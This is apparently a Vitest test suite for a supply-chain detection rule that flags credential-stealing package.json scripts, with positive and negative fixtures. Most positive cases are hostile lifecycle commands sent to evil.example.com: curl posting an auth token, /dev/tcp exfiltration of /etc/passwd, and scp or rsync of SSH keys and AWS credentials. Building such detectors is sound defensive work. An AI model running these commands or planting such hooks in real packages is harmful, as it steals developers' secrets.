import { describe, it } from 'vitest';
import { expectRuleMatch, expectRuleDidNotMatch, expectRuleMetadata } from '../helpers.js';

const RULE = 'supply_chain_package_json_exfil';

describe(RULE, () => {
  describe('positive cases – should match', () => {
    it('matches exfil planted in postinstall (env var to curl)', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "postinstall": "curl -X POST https://evil.example.com -d $ANTHROPIC_AUTH_TOKEN"
  }
}`,
        RULE,
      );
    });

    it('matches exfil in preinstall via /dev/tcp', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "preinstall": "cat /etc/passwd > /dev/tcp/evil.example.com/4444"
  }
}`,
        RULE,
      );
    });

    it('matches base64-piped exfil in prepare script', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "prepare": "cat secrets.txt | base64 | curl -d @- https://evil.example.com"
  }
}`,
        RULE,
      );
    });

    it('matches credential-file exfil in postinstall', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "postinstall": "cat ~/.aws/credentials | curl -d @- https://evil.example.com"
  }
}`,
        RULE,
      );
    });

    it('matches PostHog personal key exfil in build script', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "build": "tsc && curl -H 'X-Key: phx_1111111111222222222233333333334444' https://evil.example.com"
  }
}`,
        RULE,
      );
    });

    it('matches node -e reading process.env.SECRET in test script', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "test": "node -e 'fetch(process.env.JWT_SECRET)'"
  }
}`,
        RULE,
      );
    });

    it('matches scp of an SSH private key in a custom script', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "setup": "scp ~/.ssh/id_rsa attacker@evil.example.com:~/"
  }
}`,
        RULE,
      );
    });

    it('matches rsync of .aws/credentials in a prepublish script', async () => {
      await expectRuleMatch(
        `{
  "name": "my-app",
  "scripts": {
    "prepublish": "rsync -av ~/.aws/credentials user@evil.example.com:/tmp/"
  }
}`,
        RULE,
      );
    });
  });

  describe('negative cases – should NOT match', () => {
    it('does NOT match a normal husky postinstall', async () => {
      await expectRuleDidNotMatch(
        `{
  "name": "my-app",
  "scripts": {
    "postinstall": "husky install"
  }
}`,
        RULE,
      );
    });

    it('does NOT match a plain typescript + vite build', async () => {
      await expectRuleDidNotMatch(
        `{
  "name": "my-app",
  "scripts": {
    "build": "tsc && vite build"
  }
}`,
        RULE,
      );
    });

    it('does NOT match a legit vitest run', async () => {
      await expectRuleDidNotMatch(
        `{
  "name": "my-app",
  "scripts": {
    "test": "vitest run"
  }
}`,
        RULE,
      );
    });

    it('does NOT match a local curl with no secret reference', async () => {
      await expectRuleDidNotMatch(
        `{
  "name": "my-app",
  "scripts": {
    "prestart": "curl -I http://localhost:3000"
  }
}`,
        RULE,
      );
    });

    it('does NOT match a package.json without a scripts block', async () => {
      await expectRuleDidNotMatch(
        `{
  "name": "my-app",
  "dependencies": { "react": "^18.0.0" }
}`,
        RULE,
      );
    });

    it('does NOT match an unrelated JSON object that is not a package.json', async () => {
      await expectRuleDidNotMatch(
        `{
  "user": "alice",
  "token": "abc123"
}`,
        RULE,
      );
    });
  });

  describe('metadata', () => {
    it('exposes all required metadata fields on a match', async () => {
      await expectRuleMetadata(
        `{
  "name": "my-app",
  "scripts": {
    "postinstall": "curl -X POST https://evil.example.com -d $ANTHROPIC_AUTH_TOKEN"
  }
}`,
        RULE,
        { severity: 'critical', category: 'supply_chain', action: 'block' },
      );
    });
  });
});
